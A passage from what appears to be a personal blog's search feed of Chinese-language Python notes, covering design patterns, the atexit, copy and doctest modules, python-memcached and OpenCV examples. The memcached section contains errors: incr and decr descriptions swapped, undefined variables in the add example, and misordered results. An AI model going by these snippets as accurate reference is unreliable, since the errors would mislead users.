      <url>/2019/11/30/deploy/python/design_patterns/py%20prototype_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;原型模式:解决对象拷贝问题深拷贝&quot;&quot;&quot;import copyfrom collections import OrderedDictclass Book:    def __init__(self, name, authors, price, **rest):        &quot;&quot;&quot;Examples of rest: publisher, length, tags, publication date&quot;&quot;&quot;        self.name = name        self.authors = authors        self.price = price  # in US dollars        self.__dict__.update(rest)    def __str__(self):        mylist = []        ordered = OrderedDict(sorted(self.__dict__.items()))        for i in ordered.keys():            mylist.append(&#39;{}: {}&#39;.format(i, ordered[i]))            if i == &#39;price&#39;:                mylist.append(&#39;$&#39;)            mylist.append(&#39;\n&#39;)        return &#39;&#39;.join(mylist)class Prototype:    def __init__(self):        self.objects = {}    def register(self, identifier, obj):        self.objects[identifier] = obj    def unregister(self, identifier):        del self.objects[identifier]    def clone(self, identifier, **attr):        &quot;&quot;&quot; 实现对象拷贝 &quot;&quot;&quot;        found = self.objects.get(identifier)        if not found:            raise ValueError(&#39;Incorrect object identifier: {}&#39;.format(identifier))        obj = copy.deepcopy(found)        obj.__dict__.update(attr)  # 实现拷贝时自定义更新        return objdef main():    b1 = Book(&#39;The C Programming Language&#39;, (&#39;Brian W. Kernighan&#39;, &#39;Dennis M.Ritchie&#39;),              price=118, publisher=&#39;Prentice Hall&#39;, length=228, publication_date=&#39;1978-02-22&#39;,              tags=(&#39;C&#39;, &#39;programming&#39;, &#39;algorithms&#39;, &#39;data structures&#39;))    prototype = Prototype()    cid = &#39;k&amp;r-first&#39;    prototype.register(cid, b1)    b2 = prototype.clone(cid, name=&#39;The C Programming Language (ANSI)&#39;, price=48.99, length=274,                         publication_date=&#39;1988-04-01&#39;, edition=2)    for i in (b1, b2):        print(i)        print(&quot;ID b1 : {} != ID b2 : {}&quot;.format(id(b1), id(b2)))</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py proxy_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20proxy_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20proxy_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;代理模式：通过一层间接保护层实现更安全的接口访问A remote proxy.使得访问远程对象就像本地访问一样，例如网络服务器。隐藏复杂性，使得访问本地远程统一。比如ORMA virtual proxy。用来实现延迟访问，比如一些需要复杂计算的对象，python里可以实现lazy_property，性能改善A protection/protective proxy. 控制敏感对象的访问，加上一层保护层，实现安全控制A smart(reference) proxy. 访问对象时加上一层额外操作，例如引用计数和线程安全检查。weakref.proxy()&quot;&quot;&quot;class LazyProperty:    &quot;&quot;&quot; 用描述符实现延迟加载的属性 &quot;&quot;&quot;    def __init__(self, method):        self.method = method        self.method_name = method.__name__    def __get__(self, obj, cls):        if not obj:            return None        value = self.method(obj)        print(&#39;value {}&#39;.format(value))        setattr(obj, self.method_name, value)        return valueclass Test:    def __init__(self):        self.x = &#39;foo&#39;        self.y = &#39;bar&#39;        self._resource = None    @LazyProperty    def resource(self):  # 构造函数里没有初始化，第一次访问才会被调用        print(&#39;initializing self._resource which is: {}&#39;.format(self._resource))        self._resource = tuple(range(5))  # 模拟一个耗时计算        return self._resourcedef main():    t = Test()    print(t.x)    print(t.y)    # 访问LazyProperty, resource里的print语句只执行一次，实现了延迟加载和一次执行    print(t.resource)    print(t.resource)main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py singleton_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20singleton_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20singleton_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;单例模式: 使得一个类最多生成一个实例很奇怪，本书讲完了都没有讲到单例模式。python的单例模式有各种实现，元类、装饰器等，但是还有一种说法：I don’t really see the need, as a module with functions (and not a class) would serve well as a singleton.All its variables would be bound to the module, which could not be instantiated repeatedly anyway.If you do wish to use a class, there is no way of creating private classes or private constructors in Python,so you can’t protect against multiple instantiations, other than just via convention in use of your API.I would still just put methods in a module, and consider the module as the singleton.也就是说，实际上，python中，如果我们只用一个实例，写法如下&quot;&quot;&quot;# some module.pyclass SingletonClass:    pass# 在别处我们想用这个实例都直接使用 module.single_instance 这个实例就好。# 这是最简单也是最直观的一种方式,嗯，直接导入这个实例用，而不是导入class，简单粗暴single_instance = SingletonClass()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py state_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20state_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20state_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;状态模式：实现有限状态机允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。 一个对象的行为取决于它的状态, 并且它必须在运行时刻根据状态改变它的行为。 一个操作中含有庞大的多分支的条件语句，且这些分支依赖于该对象的状态。 这个状态通常用一个或多个枚举常量表示。通常, 有多个操作包含这一相同的条件结构。 State模式将每一个条件分支放入一个独立的类中。 这使得你可以根据对象自身的情况将对象的状态作为一个对象，这一对象可以不依赖于其他对象而独立变化&quot;&quot;&quot;class State(object):    &quot;&quot;&quot;Base state. This is to share functionality&quot;&quot;&quot;    def scan(self):        &quot;&quot;&quot;Scan the dial to the next station&quot;&quot;&quot;        self.pos += 1        if self.pos == len(self.stations):            self.pos = 0        print(&quot;Scanning... Station is&quot;, self.stations[self.pos], self.name)class AmState(State):    def __init__(self, radio):        self.radio = radio        self.stations = [&quot;1250&quot;, &quot;1380&quot;, &quot;1510&quot;]        self.pos = 0        self.name = &quot;AM&quot;    def toggle_amfm(self):        print(&quot;Switching to FM&quot;)        self.radio.state = self.radio.fmstateclass FmState(State):    def __init__(self, radio):        self.radio = radio        self.stations = [&quot;81.3&quot;, &quot;89.1&quot;, &quot;103.9&quot;]        self.pos = 0        self.name = &quot;FM&quot;    def toggle_amfm(self):        print(&quot;Switching to AM&quot;)        self.radio.state = self.radio.amstateclass Radio(object):    &quot;&quot;&quot;A radio.     It has a scan button, and an AM/FM toggle switch.&quot;&quot;&quot;    def __init__(self):        &quot;&quot;&quot;We have an AM state and an FM state&quot;&quot;&quot;        self.amstate = AmState(self)        self.fmstate = FmState(self)        self.state = self.amstate    def toggle_amfm(self):        self.state.toggle_amfm()    def scan(self):        self.state.scan()# Test our radio outif __name__ == &#39;__main__&#39;:    radio = Radio()    actions = [radio.scan] * 2 + [radio.toggle_amfm] + [radio.scan] * 2    actions = actions * 2    for action in actions:        action()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py strategy_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20strategy_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20strategy_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;策略模式：动态选择算法策略现实中往往解决问题的方式不止一种，我们可能需要根据问题的特征选择最优的实现策略函数在python里是一等公民，可以简化策略模式的实现。&quot;&quot;&quot;threshold_value = 10def f1(seq):    passdef f2(seq):    passdef f(seq):    if len(seq) &gt;= threshold_value:  # 大于某个阈值        f1(seq)  # 在数量较多时候具有良好的效率    else:        f2(seq)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py template_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20template_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20template_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;模板模式：抽象出算法公共部分从而实现代码复用模板模式中，我们可以把代码中重复的部分抽出来作为一个新的函数，把可变的部分作为函数参数，从而消除代码冗余。一次性实现一个算法的不变的部分，并将可变的行为留给子类来实现。控制子类扩展。模板方法只在特定点调用“hook ”操作，这样就只允许在这些点进行扩展。&quot;&quot;&quot;ingredients = &quot;spam eggs apple&quot;line = &#39;-&#39; * 10# Skeletonsdef iter_elements(getter, action):    &quot;&quot;&quot;Template skeleton that iterates items&quot;&quot;&quot;    for element in getter():        action(element)        print(line)def rev_elements(getter, action):    &quot;&quot;&quot;Template skeleton that iterates items in reverse order&quot;&quot;&quot;    for element in getter()[::-1]:        action(element)        print(line)    # Gettersdef get_list():    return ingredients.split()def get_lists():    return [list(x) for x in ingredients.split()]# Actionsdef print_item(item):    print(item)def reverse_item(item):    print(item[::-1])# Makes templatesdef make_template(skeleton, getter, action):    &quot;&quot;&quot;Instantiate a template method with getter and action&quot;&quot;&quot;    def template():        skeleton(getter, action)    return template# Create our template functionstemplates = [make_template(s, g, a)             for g in (get_list, get_lists)             for a in (print_item, reverse_item)             for s in (iter_elements, rev_elements)]# Execute themfor template in templates:    template()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py atexit.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20atexit/"/>
      <url>/2019/11/30/deploy/python/libs/py%20atexit/</url>
      
        <content type="html"><![CDATA[<blockquote><p>当成程序在退出时(不论是否正常退出，ctrl+c无效)，<br>注册执行的函数，栈式，先进后出调用</p></blockquote><pre><code class="python">import atexit@atexit.registerdef a():    print(&#39;a&#39;)def b():    print(&#39;b&#39;)def c():    print(&#39;c&#39;)print(4)atexit.register(b)atexit.register(c)print(3)atexit.unregister(b)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py copy.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20copy/"/>
      <url>/2019/11/30/deploy/python/libs/py%20copy/</url>
      
        <content type="html"><![CDATA[<pre><code class="python">#!/usr/bin/python# -*-coding:utf-8 -*-import copya = [1, 2, 3, 4, [&#39;a&#39;, &#39;b&#39;]]  # 原始对象b = a  # 赋值，传对象的引用c = copy.copy(a)  # 对象拷贝，浅拷贝d = copy.deepcopy(a)  # 对象拷贝，深拷贝e = a.copy()a.append(5)  # 修改对象aa[4].append(&#39;c&#39;)  # 修改对象a中的[&#39;a&#39;, &#39;b&#39;]数组对象print(&#39;a = &#39;, a)print(&#39;b = &#39;, b)print(&#39;c = &#39;, c)print(&#39;d = &#39;, d)print(&#39;e = &#39;, e)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py doctest.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20doctest/"/>
      <url>/2019/11/30/deploy/python/libs/py%20doctest/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/liuchunming033/article/details/51455663" target="_blank" rel="noopener">博客参考</a></p><p>doctest的编写过程就像你在一个交互式shell中导入了一个被测试模块，<br>然后一条一条执行被测试模块里面的函数一样。</p><p>这里只记录doctest独立文件的方式（另一个方式是嵌入到源代码中）</p><pre><code class="python"># file: test.pydef get_sum(a, b):    return str(a) + str(b)</code></pre><pre><code class="python">file:doc_test&gt;&gt;&gt; from test import get_sum&gt;&gt;&gt; get_sum(3, 4)&#39;34&#39;&gt;&gt;&gt; get_sum(&#39;a&#39;, 3)&#39;a3&#39;</code></pre><p>执行下面的命令</p><pre><code class="python">python -m doctest -v doc_test</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py memcached.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20memcached/"/>
      <url>/2019/11/30/deploy/python/libs/py%20memcached/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="python">pip install python-memcached</code></pre><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><pre><code class="python">#!/usr/bin/env python3#coding:utf8import memcache#链接mc = memcache.Client([&#39;139.129.5.191:12000&#39;], debug=True)#插入mc.set(&quot;name&quot;, &quot;python&quot;)#读取ret = mc.get(&#39;name&#39;)print (ret)# 输出结果python# debug=True表示运行出现错误时，可以显示错误信息，正式环境可以不加</code></pre><h2 id="支持集群"><a href="#支持集群" class="headerlink" title="支持集群"></a>支持集群</h2><blockquote><p>python-memcached模块原生支持集群操作，其原理是在内存中维护一个主机列表，<br>且集群中主机的权重值和主机在列表中重复出现的次数成正比</p></blockquote><p>主机列表为：host_list = [“1.1.1.1”, “1.1.1.2”,”1.1.1.2”,”1.1.1.3”,”1.1.1.3”,”1.1.1.3”,]</p><p>用户如果要在内存中创建一个键值对（如：k1 = “value1”），那么要执行以下步骤：</p><ol><li>根据算法将k1转换成一个数字</li><li>将数字和主机列表长度求余数，得到一个值N（0 &lt;= N &lt; 长度）</li><li>在主机列表中根据第二步得到的值为索引获取主机，例如: host_list[N]</li><li>连接将第三步中获取的主机，将k1 = “value1” 放置在该服务器的内存中</li></ol><pre><code>#!/usr/bin/env python3#coding:utf8import memcachemc = memcache.Client([(&#39;1.1.1.1:12000&#39;, 1), (&#39;1.1.1.2:12000&#39;, 2),(&#39;1.1.1.3:12000&#39;,3)])mc.set(&#39;k1&#39;,&#39;value1&#39;)ret = mc.get(&#39;k1&#39;)print (ret)</code></pre><h2 id="基本memcached操作"><a href="#基本memcached操作" class="headerlink" title="基本memcached操作"></a>基本memcached操作</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><blockquote><p>添加一条键值对，如果已经存在的key，重复执行add操作会出现异常</p></blockquote><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.add(&#39;k1&#39;, &#39;v1&#39;)mc.add(&#39;k1&#39;, &#39;v2&#39;) # 报错，对已经存在的key重复添加，失败！！！例如：ret1 = mc.add(&#39;name&#39;,&#39;tom&#39;)print(refalse)ret2 = mc.add(&#39;name&#39;,&#39;jack&#39;)print(retrue)结果：False #当已经存在key 那么返回falseTrue  #如果不存在key 那么返回true</code></pre><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><blockquote><p>replace修改某个key的值，如果key不存在，则异常</p></blockquote><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;name&#39;,&#39;tom&#39;)re = mc.get(&#39;name&#39;)print(re)rereplace = mc.replace(&#39;name&#39;,&#39;jack&#39;)re = mc.get(&#39;name&#39;)print(rereplace,re)结果：tom  #第一次赋值True jack #如果存在key那么修改成功为yaoyao 返回Truerereplace = mc.replace(&#39;name1&#39;,&#39;hahaha&#39;)re = mc.get(&#39;name1&#39;)print(rereplace,re)结果：False None #如果不存在key，修改失败，返回空值</code></pre><h3 id="set-和-set-multi"><a href="#set-和-set-multi" class="headerlink" title="set 和 set_multi"></a>set 和 set_multi</h3><blockquote><p>set : 设置一个键值对，如果Key不存在，则创建，如果key存在，则修改。</p></blockquote><blockquote><p>set_multi : 设置多个键值对，如果key不存在，则创建，如果key存在，则修改。</p></blockquote><pre><code class="python">import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;name&#39;,&#39;tom&#39;)re = mc.get(&#39;name&#39;)print(&#39;set用法&#39;,re) #设置一个键值对dic = {&#39;name&#39;:&#39;to,&#39;,&#39;age&#39;:&#39;19&#39;,&#39;job&#39;:&#39;IT&#39;}mc.set_multi(dic)  #设置多个键值对#或者mc.set_multi({&#39;name&#39;:&#39;tom&#39;,&#39;age&#39;:&#39;19&#39;,&#39;job&#39;:&#39;IT&#39;})mcname = mc.get(&#39;name&#39;)mcage = mc.get(&#39;age&#39;)mcjob = mc.get(&#39;job&#39;)print(&#39;set_multi用法:&#39;,mcname,mcage,mcjob)</code></pre><h3 id="delete-和-delete-multi"><a href="#delete-和-delete-multi" class="headerlink" title="delete 和 delete_multi"></a>delete 和 delete_multi</h3><blockquote><p>delete : 在Memcached中删除指定的一个键值对</p></blockquote><blockquote><p>delete_multi : 在Memcached中删除指定多个键值对</p></blockquote><pre><code class="python">import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;name&#39;,&#39;tom&#39;)re = mc.get(&#39;name&#39;)print(&#39;存在&#39;,re)mc.delete(&#39;name&#39;)re = mc.get(&#39;name&#39;)print(&#39;删除&#39;,re)  #删除一个键值对</code></pre><h3 id="get-和-get-multi"><a href="#get-和-get-multi" class="headerlink" title="get 和 get_multi"></a>get 和 get_multi</h3><blockquote><p>get : 获取一个键值对</p></blockquote><blockquote><p>get_multi : 获取多个键值对</p></blockquote><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;name&#39;,&#39;tom&#39;)re = mc.get(&#39;name&#39;)print(&#39;get&#39;,re)     #获取一个键值对dic = {&#39;name&#39;:&#39;to,&#39;,&#39;age&#39;:&#39;19&#39;,&#39;job&#39;:&#39;IT&#39;}mc.set_multi(dic)regetmu=mc.get_multi([&#39;name&#39;,&#39;age&#39;,&#39;job&#39;])print(&#39;get_multi&#39;,re) #获取多个键值对的值</code></pre><h3 id="append-和-prepend"><a href="#append-和-prepend" class="headerlink" title="append 和 prepend"></a>append 和 prepend</h3><blockquote><p>append : 修改指定key的值，在该值后面追加内容。</p></blockquote><blockquote><p>prepend : 修改指定key的值，在该值前面插入内容。</p></blockquote><pre><code class="python">import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;num&#39;,&#39;第一|&#39;)re = mc.get(&#39;num&#39;)print(re)mc.append(&#39;num&#39;,&#39;追加第二个&#39;) #在第一后面追加re = mc.get(&#39;num&#39;)print(re)mc.prepend(&#39;num&#39;,&#39;我是零个&#39;)  #在第一前面追加re = mc.get(&#39;num&#39;)print(re)结果：第一|第一|追加第二个我是零个第一|追加第二个</code></pre><h3 id="decr-和-incr"><a href="#decr-和-incr" class="headerlink" title="decr 和 incr"></a>decr 和 incr</h3><blockquote><p>decr : 自减，将Memcached中的一个值增加N（N默认为1）</p></blockquote><blockquote><p> incr  : 自增，将Memcached中的一个值减少N（N默认为1）</p></blockquote><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;])mc.set(&#39;num&#39;,&#39;1&#39;)re = mc.get(&#39;num&#39;)print(&#39;我是没加过的值&#39;,re)mc.incr(&#39;num&#39;,&#39;9&#39;)re = mc.get(&#39;num&#39;)print(&#39;我是加上新增后的值&#39;,re)mc.decr(&#39;num&#39;,&#39;5&#39;)re = mc.get(&#39;num&#39;)print(&#39;我是减去的值&#39;,re)# 结果：我是没加过的值 1我是加上新增后的值 10是减去的值 5</code></pre><h3 id="gets-和-cas"><a href="#gets-和-cas" class="headerlink" title="gets 和 cas"></a>gets 和 cas</h3><blockquote><p>使用缓存系统共享数据资源就必然绕不开数据争夺和脏数据（数据混乱）的问题。</p></blockquote><p>假设商城某件商品的剩余个数保存在memcache中，product_count = 900<br>A用户刷新页面从memecache中读取到product_count = 900<br>B用户刷新页面从memecache中读取到product_count = 900<br>A,B用户均购买商品，并修改product_count的值<br>A修改后，product_count = 899<br>B修改后，product_count = 899<br>然而正确数字应该是898，数据就混乱了。<br>如果想要避免这种情况的发生，则可以使用  gets　和　cas  </p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import memcachemc = memcache.Client([&#39;0.0.0.0:12000&#39;],cache_cas=True)mc.set(&#39;count&#39;,&#39;10&#39;)reget = mc.get(&#39;count&#39;)print(&#39;件数&#39;,reget)regets = mc.gets(&#39;count&#39;)print(regets)# 如果有人在gets之后和cas之前修改了product_count，那么，下面的设置将会执行失败，剖出异常，从而避免非正常数据的产生recas = mc.cas(&#39;count&#39;,&#39;11&#39;)print(recas)regets = mc.gets(&#39;count&#39;)print(&#39;修改&#39;,regets)</code></pre><blockquote><p>本质上每次执行gets时，会从memcache中获取一个自增的数字，通过cas去修改gets的值时，<br>会携带之前获取的自增和memcache中的自增值进行比较，如果相等，则可以提交，如果不相等，<br>那么表示在gets和cas执行之间，又有其他人执行了gets，则不允许修改。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py opencv.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20opencv/"/>
      <url>/2019/11/30/deploy/python/libs/py%20opencv/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>读取显示图片</p><pre><code class="python"># -*- coding: utf-8 -*-import numpy as npimport cv2cap = cv2.VideoCapture(0)while 1:    # 得到每一帧图像    ret, frame = cap.read()    frame = cv2.flip(frame, 1)    # 转换为灰度图像    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)    # 卷积核    kernel = np.ones((3, 3), np.float32) / 25    # 平滑，降噪    dst = cv2.filter2D(gray, -1, kernel)    # Canny 边缘检测    edges = cv2.Canny(dst, 20, 20)    # 显示每一帧图像    cv2.imshow(&quot;capture&quot;, edges)    if cv2.waitKey(100) &amp; 0xFF == ord(&#39;q&#39;):        break    # 延时 30 ms，任意键退出    # if(cv2.waitKey(30) &gt;= 0):    #     breakcap.release()cv2.destroyAllWindows()</code></pre><p>形态学腐蚀</p><pre><code class="python"># -*- coding: utf-8 -*-import cv2import numpy as np# Load an color image in grayscale&quot;&quot;&quot;就像土壤侵蚀一样，这个操作会把前景物体的边界腐蚀掉（但是前景仍然是白色）。这是怎么做到的呢？卷积核沿着图像滑动，如果与卷积核对应的原图像的所有像素值都是1，那么中心元素就保持原来的像素值，否则就变为零。这回产生什么影响呢？根据卷积核的大小靠近前景的所有像素都会被腐蚀掉（变为0），所以前景物体会变小，整幅图像的白色区域会减少。这对于去除白噪声很有用，也可以用来断开两个连在一块的物体等。&quot;&quot;&quot;# 读入图像img = cv2.imread(&#39;t.png&#39;, cv2.IMREAD_COLOR)# 卷积核kernel = np.ones((5, 5), np.uint8)# 腐蚀erosion = cv2.erode(img, kernel, iterations=1)# 第一个参数是窗口名称， 第二个是要显示的图片cv2.imshow(&#39;image&#39;, img)cv2.imshow(&#39;image2&#39;, erosion)# 0 等待任意键按下， &gt;0 时为等待多少毫秒cv2.waitKey(0)cv2.destroyAllWindows()</code></pre><p>图像平滑_2D卷积</p><pre><code class="python"># -*- coding: utf-8 -*-import cv2import numpy as np&quot;&quot;&quot;将核放在图像的一个像素A 上，求与核对应的图像上25（5x5）个像素的和，在取平均数，用这个平均数替代像素A 的值。重复以上操作直到将图像的每一个像素值都更新一边&quot;&quot;&quot;# 读入图像img = cv2.imread(&#39;t.png&#39;, cv2.IMREAD_COLOR)# 卷积核kernel = np.ones((5, 5), np.float32)/25# 平滑dst = cv2.filter2D(img, -1, kernel)# 第一个参数是窗口名称， 第二个是要显示的图片cv2.imshow(&#39;image&#39;, img)cv2.imshow(&#39;image2&#39;, dst)# 0 等待任意键按下， &gt;0 时为等待多少毫秒cv2.waitKey(0)cv2.destroyAllWindows()</code></pre><p>播放视频</p><p>“””<br>要安装 ffmpeg 可参考：<a href="http://blog.csdn.net/heyijia0327/article/details/44034671" target="_blank" rel="noopener">python + opencv: 解决不能读取视频的问题</a></p><p>两种方法都需要完成的共同一步是：<br>找到opencv安装路径下的\sources\3rdparty\ffmpeg文件夹，如D:\soft setup pack\Python_setpack\opencv\sources\3rdparty\ffmpeg。将文件夹中的opencv_ffmpeg.dll文件名修改为opencv_ffmpeg2410.dll，如果你安装的是opencv2.4.9，那就修改成opencv_ffmpeg249.dll。其他版本依次类推。如果你是64位的系统，那就修改opencv_ffmpeg_64.dll文件名为opencv_ffmpeg2410_64.dll。</p><ol><li>方法1：将opencv_ffmpeg2410.dll复制到E:\programming soft\python2.7文件夹下即可，其中E:\programming soft\为python安装路径。</li><li>方法2：在windows的环境变量中添加上D:\soft setup pack\Python_setpack\opencv\sources\3rdparty\ffmpeg，其中D:\soft setup pack\Python_setpack\为博主电脑上OpenCv的安装路径。<br>“””</li></ol><pre><code class="python"># -*- coding: utf-8 -*-import numpy as npimport cv2cap = cv2.VideoCapture(&quot;./t.mp4&quot;)while 1:    # 得到每一帧图像    ret, frame = cap.read()    # 显示每一帧图像    cv2.imshow(&quot;capture&quot;, frame)    if cv2.waitKey(100) &amp; 0xFF == ord(&#39;q&#39;):        breakcap.release()cv2.destroyAllWindows()</code></pre><p>Canny 边缘检测</p><pre><code class="python"># -*- coding: utf-8 -*-import cv2import numpy as np&quot;&quot;&quot;将核放在图像的一个像素A 上，求与核对应的图像上25（5x5）个像素的和，在取平均数，用这个平均数替代像素A 的值。重复以上操作直到将图像的每一个像素值都更新一边&quot;&quot;&quot;# 读入原始图像，转换为灰度图像img = cv2.imread(&#39;t2.jpg&#39;, cv2.IMREAD_COLOR)img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)# 直接以灰度读取# img = cv2.imread(&#39;t.png&#39;, cv2.IMREAD_GRAYSCALE)# 卷积核kernel = np.ones((3, 3), np.float32)/25# 平滑，降噪dst = cv2.filter2D(img, -1, kernel)# Canny 边缘检测edges = cv2.Canny(dst, 10, 10)# 第一个参数是窗口名称， 第二个是要显示的图片cv2.imshow(&#39;image&#39;, img)cv2.imshow(&#39;image2&#39;, edges)# 0 等待任意键按下， &gt;0 时为等待多少毫秒cv2.waitKey(0)cv2.destroyAllWindows()</code></pre><p>从摄像头获取并处理</p><pre><code class="python"># -*- coding: utf-8 -*-import numpy as npimport cv2cap = cv2.VideoCapture(0)while 1:    # 得到每一帧图像    ret, frame = cap.read()    frame = cv2.flip(frame, 1)    # 转换为灰度图像    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)    # 卷积核    kernel = np.ones((3, 3), np.float32) / 25    # 平滑，降噪    dst = cv2.filter2D(gray, -1, kernel)    # Canny 边缘检测    edges = cv2.Canny(dst, 20, 20)    # 显示每一帧图像    cv2.imshow(&quot;capture&quot;, edges)    if cv2.waitKey(100) &amp; 0xFF == ord(&#39;q&#39;):        break    # 延时 30 ms，任意键退出    # if(cv2.waitKey(30) &gt;= 0):    #     breakcap.release()cv2.destroyAllWindows()</code></pre><h2 id="cv2-imdecode-和cv2-imencode-图片解码和编码"><a href="#cv2-imdecode-和cv2-imencode-图片解码和编码" class="headerlink" title="cv2.imdecode()和cv2.imencode() 图片解码和编码"></a>cv2.imdecode()和cv2.imencode() 图片解码和编码</h2><ul><li>cv2.imdecode()函数从指定的内存缓存中读取数据，并把数据转换(解码)成图像格式;主要用于从网络传输数据中恢复出图像。</li><li>cv2.imencode()函数是将图片格式转换(编码)成流数据，赋值到内存缓存中;主要用于图像数据格式的压缩，方便网络传输</li></ul><p><strong>imdecode()使用</strong></p><pre><code class="python"># 从网络读取图像数据并转换成图片格式# -*- coding: utf-8 -*-import numpy as npimport urllibimport cv2url = &#39;http://www.pyimagesearch.com/wp-content/uploads/2015/01/google_logo.png&#39;resp = urllib.urlopen(url)image = np.asarray(bytearray(resp.read()), dtype=&quot;uint8&quot;)image = cv2.imdecode(image, cv2.IMREAD_COLOR)cv2.imshow(&#39;URL2Image&#39;,image)cv2.waitKey()</code></pre><p><strong>imencode()使用</strong></p><pre><code class="python"># 将图片编码到缓存，并保存到本地# -*- coding: utf-8 -*-import numpy as npimport urllibimport cv2img = cv2.imread(&#39;0122.jpg&#39;)# &#39;.jpg&#39;表示把当前图片img按照jpg格式编码，按照不同格式编码的结果不一样img_encode = cv2.imencode(&#39;.jpg&#39;, img)[1]# imgg = cv2.imencode(&#39;.png&#39;, img)data_encode = np.array(img_encode)str_encode = data_encode.tostring()# 缓存数据保存到本地with open(&#39;img_encode.txt&#39;, &#39;w&#39;) as f:    f.write(str_encode)    f.flush</code></pre><p><strong>imencode()+imdecode()使用</strong></p><pre><code class="python"># 图片编码保存到本地，读取本地文件解码恢复成图片格式# -*- coding: utf-8 -*-import numpy as npimport urllibimport cv2img = cv2.imread(&#39;0122.jpg&#39;)# &#39;.jpg&#39;表示把当前图片img按照jpg格式编码，按照不同格式编码的结果不一样img_encode = cv2.imencode(&#39;.jpg&#39;, img)[1]# imgg = cv2.imencode(&#39;.png&#39;, img)data_encode = np.array(img_encode)str_encode = data_encode.tostring()# 缓存数据保存到本地，以txt格式保存with open(&#39;img_encode.txt&#39;, &#39;w&#39;) as f:    f.write(str_encode)    f.flushwith open(&#39;img_encode.txt&#39;, &#39;r&#39;) as f:    str_encode = f.read()nparr = np.fromstring(str_encode, np.uint8)img_decode = cv2.imdecode(nparr, cv2.IMREAD_COLOR)cv2.imshow(&quot;img_decode&quot;, img_decode)cv2.waitKey()</code></pre><p>或者</p><pre><code class="python"># -*- coding: utf-8 -*-import numpy as npimport urllibimport cv2img = cv2.imread(&#39;0122.jpg&#39;)# &#39;.jpg&#39;表示把当前图片img按照jpg格式编码，按照不同格式编码的结果不一样img_encode = cv2.imencode(&#39;.jpg&#39;, 